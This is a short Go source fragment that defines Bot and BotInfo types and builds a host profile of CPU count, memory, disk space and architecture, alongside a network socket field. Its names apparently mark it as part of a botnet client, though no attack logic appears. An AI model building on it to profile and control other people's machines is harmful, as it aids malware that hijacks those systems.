package network

import (
	"bot/lib/utils"
	"net"
	"runtime"
)

type BotInfo struct {
	Cpu  int
	Mem  int
	Disk int
	Arch string
}

type Bot struct {
	Info      BotInfo
	Socket    net.Conn
	Connected bool
}

var (
	Profile = BotInfo{
		Cpu:  runtime.NumCPU(),
		Mem:  utils.GetMemory(),
		Disk: utils.GetDiskSpace(),
		Arch: utils.GetCPUArch(),
	}
)
